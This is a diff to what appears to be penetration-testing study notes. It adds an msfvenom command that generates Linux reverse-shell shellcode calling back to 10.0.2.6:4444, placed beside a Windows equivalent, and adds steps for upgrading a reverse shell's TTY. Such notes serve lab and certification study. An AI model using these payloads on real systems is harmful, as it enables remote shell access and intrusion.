@@ -531,7 +531,13 @@ should be inside the Debug registers
 
 In kali use msfvenom to generate shellcode
 
+for Windows:
+
     msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+
+for Linux:
+
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.6 LPORT=4444 EXITFUNC=thread -b "\x00" -f c 
 
     EXITFUNC - for stability#
     -f c - generate c shellcode
@@ -1103,11 +1109,22 @@ move over something like shell.c and gcc it + chmod +s it
 If sudo -l shows tty is missing try to get a shell by using this:
 https://netsec.ws/?p=337 
 
+*Upgrade TTY further*
+
+Enables autocomplete in reverse shell and so on
+
+Close the connection Strg + c
+
+    stty raw -echo
+    fg + enter (twice)
+
+Back in the shell
+
+    export TERM=xterm
+
 *Monitor Process unprivileged*
 
     https://github.com/DominicBreuker/pspy 
-
-
 
 **Windows Post Exploitation**
 
